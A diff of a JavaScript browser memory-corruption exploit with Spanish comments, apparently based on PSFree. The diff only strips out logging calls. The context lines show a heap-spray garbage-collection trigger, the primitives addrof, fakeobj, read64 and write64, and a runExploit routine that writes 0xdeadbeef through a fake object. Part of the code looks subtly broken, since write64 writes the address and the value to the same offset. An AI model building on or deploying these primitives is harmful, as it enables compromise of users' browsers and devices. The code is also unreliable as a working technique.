@@ -53,11 +53,9 @@ async function log(message) {
 
 // Función que provoca la recolección de basura
 async function gc() {
-  await log("Triggering garbage collection...");
   for (let i = 0; i < 10000; i++) {
     let tmp = new ArrayBuffer(0x10000); // Genera basura para que el GC lo procese.
   }
-  await log("Garbage collection complete.");
 }
 
 // Primitivas necesarias para la explotación: read, write, addrof, fakeobj
@@ -65,7 +63,6 @@ let addrof, fakeobj, read64, write64;
 
 // Función que prepara las primitivas para interactuar con la memoria.
 async function setupPrimitives() {
-  await log("Setting up primitives...");
   
   // Utiliza PSFree para manipular el heap con overlap y corrupción de objetos.
   addrof = function(o) {
@@ -91,8 +88,6 @@ async function setupPrimitives() {
     fake_view.setBigUint64(0, BigInt(addr), true);  // Coloca la dirección.
     fake_view.setBigUint64(0, BigInt(val), true);  // Coloca el valor que deseas escribir.
   };
-
-  await log("Primitives setup complete.");
 }
 
 // Lanzar recolección de basura y preparar primitivas.
@@ -107,7 +102,6 @@ async function runExploit() {
   // Corromper memoria a través de fakeobj y escribir un valor.
   let fake = fakeobj(addr + 0x20);
   write64(addr + 0x10, 0xdeadbeef); // Escribe un valor en una ubicación específica.
-  await log("Fake object manipulation complete.");
 }
 
 // Ejecutar la explotación con monitoreo
